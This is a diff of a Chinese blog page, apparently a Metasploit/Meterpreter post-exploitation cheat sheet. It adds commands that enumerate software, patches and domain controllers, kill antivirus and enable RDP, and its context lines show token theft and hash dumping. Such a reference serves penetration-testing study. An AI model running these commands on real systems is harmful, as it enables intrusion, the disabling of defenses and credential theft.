@@ -93,7 +93,7 @@
 <meta property="og:site_name" content="MaiKeFee|">
 <meta property="og:description" content="后渗透脚本知识 权限维持、权限提升、内网渗透等   内网渗透：信息搜集、读取用户hash、浏览器密码   域渗透：获取域控的控制权  Meterpreter基本概念 Meterpreter是Metasploit框架中的一个扩展模块，在攻击成 功以后给我们返回一个控制通道，是metsploit后渗透必不可少的 ，它具有强大的功能，包括socks代理，端口转发，键盘监听等多 个功能，meterpret">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-09T03:27:42.808Z">
+<meta property="og:updated_time" content="2019-09-09T06:38:35.360Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MSF后渗透利用整理|MSF命令大全">
 <meta name="twitter:description" content="后渗透脚本知识 权限维持、权限提升、内网渗透等   内网渗透：信息搜集、读取用户hash、浏览器密码   域渗透：获取域控的控制权  Meterpreter基本概念 Meterpreter是Metasploit框架中的一个扩展模块，在攻击成 功以后给我们返回一个控制通道，是metsploit后渗透必不可少的 ，它具有强大的功能，包括socks代理，端口转发，键盘监听等多 个功能，meterpret">
@@ -357,7 +357,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-09T11:27:42+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-09T14:38:35+08:00">
                 2019-09-09
               </time>
             
@@ -590,7 +590,22 @@ meterpreter &gt; load incognito #加载incoginto 盗窃目标主机的令牌或�
 
 
 
-④screenshot ：截屏</code></pre><h2 id="4-用户口令"><a href="#4-用户口令" class="headerlink" title="4.用户口令"></a>4.用户口令</h2><h3 id="①hash"><a href="#①hash" class="headerlink" title="①hash"></a>①hash</h3><pre><code>我们需要将administrator权限提升至system权限才能获取成功
+④screenshot ：截屏</code></pre><blockquote>
+<p>获取目标主机安装软件信息；</p>
+</blockquote>
+<pre><code>run post/windows/gather/enum_applications</code></pre><blockquote>
+<p>查看目标主机的补丁信息；</p>
+</blockquote>
+<pre><code>Run post/windows/gather/enum_patches </code></pre><blockquote>
+<p>查找目标主机域控 </p>
+</blockquote>
+<pre><code>run post/windows/gather/enum_domain  </code></pre><blockquote>
+<p>关闭杀毒软件    </p>
+</blockquote>
+<pre><code>run post/windows/manage/killav </code></pre><blockquote>
+<p>开启3389远程桌面</p>
+</blockquote>
+<pre><code>run post/windows/manage/enable_rdp</code></pre><h2 id="4-用户口令"><a href="#4-用户口令" class="headerlink" title="4.用户口令"></a>4.用户口令</h2><h3 id="①hash"><a href="#①hash" class="headerlink" title="①hash"></a>①hash</h3><pre><code>我们需要将administrator权限提升至system权限才能获取成功
 
 
     meterpreter &gt; run post/windows/gather/smart_hashdump
